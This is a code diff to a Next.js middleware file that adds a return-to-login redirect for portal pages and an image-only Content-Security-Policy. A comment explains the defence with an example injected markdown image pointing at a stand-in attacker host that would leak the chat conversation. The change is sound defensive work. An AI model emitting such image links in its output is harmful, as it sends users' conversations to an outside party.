@@ -1,6 +1,7 @@
 import { NextResponse } from 'next/server';
 import type { NextRequest } from 'next/server';
 import { TokenManager } from '@/lib/license/token-manager';
+import { buildLoginPath, isPortalPagePath } from '@/lib/security/returnTo';
 
 // UI paths that don't require a session cookie.
 const PUBLIC_UI_PATHS = [
@@ -11,7 +12,7 @@ const PUBLIC_UI_PATHS = [
 ];
 
 /** Inject common security headers into every response. */
-function applySecurityHeaders(response: NextResponse): void {
+function applySecurityHeaders(response: NextResponse, pathname = ''): void {
   response.headers.set('X-Content-Type-Options', 'nosniff');
   response.headers.set('X-Frame-Options', 'DENY');
   response.headers.set('X-XSS-Protection', '1; mode=block');
@@ -25,6 +26,28 @@ function applySecurityHeaders(response: NextResponse): void {
     'Strict-Transport-Security',
     'max-age=31536000; includeSubDomains',
   );
+  // Portal pages render model output as markdown, and markdown images load on
+  // their own: an injected `![](https://attacker/?q=<conversation>)` would leak
+  // the chat. Images may only come from this origin (or inline); this is the
+  // only directive, so nothing else on the page is affected.
+  if (isPortalPagePath(pathname)) {
+    response.headers.set('Content-Security-Policy', "img-src 'self' data: blob:");
+  }
+}
+
+/**
+ * Where an unauthenticated visitor is sent. Portal pages (`/p/<key>`) are links
+ * people receive and open cold, so they carry the way back through login. Every
+ * other path keeps the bare `/login` it always had.
+ *
+ * `/p/*` is deliberately NOT a dashboard path: the project / no-project
+ * redirect lives in the dashboard layout and nothing here ties it to
+ * admin-only or licence-gated UI, so a portal user without any project passes
+ * once the session cookie is valid.
+ */
+function loginRedirectPath(request: NextRequest): string {
+  const { pathname, search } = request.nextUrl;
+  return isPortalPagePath(pathname) ? buildLoginPath(`${pathname}${search}`) : '/login';
 }
 
 export async function middleware(request: NextRequest) {
@@ -40,14 +63,14 @@ export async function middleware(request: NextRequest) {
   const token = request.cookies.get('token')?.value;
 
   if (!token) {
-    return NextResponse.redirect(new URL('/login', request.url));
+    return NextResponse.redirect(new URL(loginRedirectPath(request), request.url));
   }
 
   // Verify token
   const payload = await TokenManager.verifyToken(token);
 
   if (!payload) {
-    const response = NextResponse.redirect(new URL('/login', request.url));
+    const response = NextResponse.redirect(new URL(loginRedirectPath(request), request.url));
     response.cookies.delete('token');
     return response;
   }
@@ -84,11 +107,13 @@ export async function middleware(request: NextRequest) {
       headers: requestHeaders,
     },
   });
-  applySecurityHeaders(response);
+  applySecurityHeaders(response, pathname);
   return response;
 }
 
 export const config = {
+  // `/p/*` (portal pages) falls inside this matcher: only the prefixes listed
+  // below are excluded, and there is a unit test that pins it.
   matcher: [
     /*
      * Match all request paths except for the ones starting with:
